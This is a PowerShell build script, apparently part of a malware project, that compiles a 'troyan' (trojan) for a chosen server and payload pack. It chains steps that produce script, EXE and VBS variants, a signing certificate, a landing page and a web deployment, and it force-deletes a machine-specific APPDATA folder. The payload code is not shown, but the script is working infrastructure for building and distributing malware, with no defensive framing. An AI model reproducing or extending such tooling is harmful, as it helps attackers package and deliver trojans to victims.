param (
    [string]$serverName, [string]$action = "apply", [string]$packId = ""
)

$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location -Path $scriptDir
. ".\lib.ps1"

if ($serverName -eq "") {
    $serverName = detectServer
    $action = "apply"
} 

if ([string]::IsNullOrEmpty($serverName))
{
    throw "compile.ps1 -serverName argument is null"
}

Write-Host "Compiling server $serverName, action $action, pack $packId"

#currents
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location -Path $scriptDir
. ".\current.ps1" -serverName $serverName
. "..\troyan\troyanps\utils.ps1"
if ([string]::IsNullOrEmpty($server.rootDir)) {
    throw "compile1.ps1 - server is not linked"
}

$hep = Get-MachineCode
if ([string]::IsNullOrEmpty($hep) -eq $false)
{
    $folderPath = [System.IO.Path]::Combine($env:APPDATA, $hep)
    if (Test-Path -Path $folderPath) {
        Remove-Item "$folderPath\*" -Recurse -Force
    }
}

if ([string]::IsNullOrEmpty($packId) -eq $false)
{
    $pack = $server.pack.items | Where-Object { $_.id -eq $packId }
    if (-not $pack) {
        throw "Item with id '$packId' not found in pack items."
    }
    #general script
    & (Join-Path -Path $server.troyanDir -ChildPath "./troyancompile.ps1") -serverName $serverName -packId $packId

    #general script to exe
    & (Join-Path -Path $server.troyanDir -ChildPath "./troyan2exe.ps1") -serverName $serverName -packId $packId

    #vbs
    & (Join-Path -Path $server.troyanVbsDir -ChildPath "./vbscompile.ps1") -serverName $serverName -packId $packId
    exit
}

#cert
& (Join-Path -Path $scriptDir -ChildPath "./compile.cert.ps1") -serverName $serverName

#general script
& (Join-Path -Path $server.troyanDir -ChildPath "./troyancompile.ps1") -serverName $serverName

#general script to exe
& (Join-Path -Path $server.troyanDir -ChildPath "./troyan2exe.ps1") -serverName $serverName

#vbs
& (Join-Path -Path $server.troyanVbsDir -ChildPath "./vbscompile.ps1") -serverName $serverName

#dn
& (Join-Path -Path $scriptDir -ChildPath "./compile.dn.ps1") -serverName $serverName

#landing
& (Join-Path -Path $scriptDir -ChildPath "./compile.landing.ps1") -serverName $serverName

#web
if ($action -eq "apply")
{
    & (Join-Path -Path $scriptDir -ChildPath "./compile.web.ps1") -serverName $serverName -action $action
}

Write-Host "Compile complete"